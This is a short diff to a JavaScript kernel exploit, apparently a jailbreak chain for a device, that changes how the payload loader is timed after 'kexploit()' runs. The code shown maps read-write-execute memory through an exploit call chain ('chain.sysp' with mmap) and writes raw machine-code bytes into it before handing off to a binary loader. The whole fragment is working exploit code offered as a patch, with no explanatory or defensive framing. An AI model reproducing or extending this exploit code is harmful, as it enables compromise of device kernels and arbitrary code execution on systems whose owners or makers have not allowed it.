@@ -1766,7 +1766,7 @@ export async function kexploit() {
   }
 
   if (localStorage.ExploitLoaded=="yes" && sessionStorage.ExploitLoaded!="yes") {
-      runBinLoader();
+      setTimeout(runBinLoader,500);
       return new Promise(() => {});
   }
     
@@ -1889,7 +1889,10 @@ function array_from_address(addr, size) {
 }
 
 kexploit().then(() => {
+  setTimeout(loadPayload,500);
+})
 
+function loadPayload() {
   const loader_addr = chain.sysp('mmap', new Int(0, 0), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
   const tmpStubArray = array_from_address(loader_addr, 1);
   tmpStubArray[0] = 0x00C3E7FF;
@@ -1913,5 +1916,4 @@ kexploit().then(() => {
     allset();
     }
   };
-
-})
+}
